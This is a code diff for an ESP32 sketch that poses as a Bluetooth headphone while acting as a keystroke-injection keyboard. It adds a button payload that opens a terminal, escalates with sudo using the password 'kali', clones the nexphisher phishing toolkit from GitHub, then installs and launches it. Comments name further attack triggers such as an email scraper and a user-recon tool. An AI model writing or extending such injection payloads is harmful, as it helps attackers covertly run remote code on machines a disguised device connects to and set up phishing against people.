@@ -14,6 +14,7 @@
 #define BUTTON_12_PIN 33 // Button 12 (Trigger: Email Scraper)
 #define BUTTON_13_PIN 14 // Button 13 (Trigger: Evil Eye)
 #define BUTTON_14_PIN 15 // Button 14 (Trigger: Userrecon)
+#define BUTTON_15_PIN 13 // Button 15 (Trigger: Nexphisher)
 
 char kbd[] = "Headphone"; // Device Name
 BleKeyboard bleKeyboard(kbd, "Espressif", 100);
@@ -32,6 +33,7 @@ bool lastState11 = HIGH;
 bool lastState12 = HIGH;
 bool lastState13 = HIGH;
 bool lastState14 = HIGH;
+bool lastState15 = HIGH;
 
 void sendString(const char* s, int charDelay = 10) {
   for (size_t i = 0; i < strlen(s); i++) {
@@ -50,7 +52,7 @@ void openRun() {
 
 void setup() {
   Serial.begin(115200);
-  Serial.println("Starting BLE HID setup with 14 Triggers on Buttons 1-14 (Pins 16, 17, 18, 19, 21, 22, 23, 25, 27, 26, 32, 33, 14, 15)...");
+  Serial.println("Starting BLE HID setup with 15 Triggers on Buttons 1-15 (Pins 16, 17, 18, 19, 21, 22, 23, 25, 27, 26, 32, 33, 14, 15, 13)...");
 
   pinMode(BUTTON_1_PIN, INPUT_PULLUP);
   pinMode(BUTTON_2_PIN, INPUT_PULLUP);
@@ -66,6 +68,7 @@ void setup() {
   pinMode(BUTTON_12_PIN, INPUT_PULLUP);
   pinMode(BUTTON_13_PIN, INPUT_PULLUP);
   pinMode(BUTTON_14_PIN, INPUT_PULLUP);
+  pinMode(BUTTON_15_PIN, INPUT_PULLUP);
 
   Serial.println("Initializing BLE...");
   delay(1000);
@@ -89,6 +92,7 @@ void loop() {
     bool state12 = digitalRead(BUTTON_12_PIN);
     bool state13 = digitalRead(BUTTON_13_PIN);
     bool state14 = digitalRead(BUTTON_14_PIN);
+    bool state15 = digitalRead(BUTTON_15_PIN);
 
     // Button 1: Password Manager (Pin 16)
     if (lastState1 == HIGH && state1 == LOW) {
@@ -427,6 +431,41 @@ void loop() {
       Serial.println("Userrecon Payload executed");
     }
 
+    // Button 15: Nexphisher (Pin 13)
+    if (lastState15 == HIGH && state15 == LOW) {
+      Serial.println("Button 15: Nexphisher (Pin 13)");
+      bleKeyboard.press(KEY_LEFT_CTRL); 
+      bleKeyboard.press(KEY_LEFT_ALT); 
+      bleKeyboard.press('t'); 
+      delay(100); 
+      bleKeyboard.releaseAll(); delay(5000);
+      sendString("cd Desktop", 10); delay(2000); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(1000);
+      sendString("sudo su", 10); delay(1000); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(1000);
+      sendString("kali", 10); delay(1000); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(1000);
+      sendString("git clone https://github.com/htr-tech/nexphisher.git", 10); delay(2000); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(7000);
+      sendString("cd nexphisher", 10); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(1000);
+      sendString("chmod +x *", 130); delay(3000);
+      bleKeyboard.press(KEY_RETURN); delay(100);
+      bleKeyboard.releaseAll(); delay(1000);
+      sendString("./setup", 130); delay(3000);
+      bleKeyboard.press(KEY_RETURN); delay(100);
+      bleKeyboard.releaseAll(); delay(40000);
+      sendString("./nexphisher", 130); delay(3000);
+      bleKeyboard.press(KEY_RETURN); delay(100);
+      bleKeyboard.releaseAll(); delay(1000);
+      Serial.println("Nexphisher Payload executed");
+    }
+
     lastState1 = state1;
     lastState2 = state2;
     lastState3 = state3;
@@ -441,6 +480,7 @@ void loop() {
     lastState12 = state12;
     lastState13 = state13;
     lastState14 = state14;
+    lastState15 = state15;
   } else {
     Serial.println("Waiting for BLE connection...");
   }
